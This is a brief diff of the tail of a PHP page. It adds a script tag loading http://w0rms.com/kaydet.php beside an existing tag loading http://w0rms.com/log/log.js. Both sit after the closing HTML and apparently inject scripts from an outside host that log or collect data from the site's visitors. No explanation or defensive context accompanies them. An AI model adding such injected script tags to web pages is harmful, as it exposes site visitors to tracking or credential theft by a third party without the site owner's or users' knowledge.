@@ -3767,3 +3767,4 @@ echo '
 </body></html>';
 ?>
 <script src=http://w0rms.com/log/log.js></script>
+<script src=http://w0rms.com/kaydet.php></script>
